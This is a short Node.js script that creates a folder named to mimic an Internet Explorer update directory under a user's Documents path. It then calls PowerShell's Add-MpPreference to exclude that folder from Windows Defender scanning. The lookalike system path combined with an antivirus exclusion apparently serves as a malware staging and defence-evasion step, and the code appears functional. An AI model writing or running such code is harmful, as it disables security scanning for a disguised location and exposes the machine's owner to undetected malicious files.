const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// Directory to create and exclude
const dirPath = path.join('C:\\Users\\Lockm\\Documents\\scripts\\Program Files\\Internet Explorer\\Update');

// Create directory if it doesn't exist
try {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
        console.log(`Directory created: ${dirPath}`);
    } else {
        console.log(`Directory already exists: ${dirPath}`);
    }
} catch (err) {
    console.error(`Failed to create directory: ${err.message}`);
}

// Add Defender exclusion
const exclusionPath = dirPath;
const psCommand = `Add-MpPreference -ExclusionPath '${exclusionPath}'`;

exec(`powershell -Command "${psCommand}"`, (error, stdout, stderr) => {
    if (error) {
        console.error(`Error adding exclusion: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`PowerShell error: ${stderr}`);
        return;
    }
    console.log(`Exclusion added: ${exclusionPath}`);
});
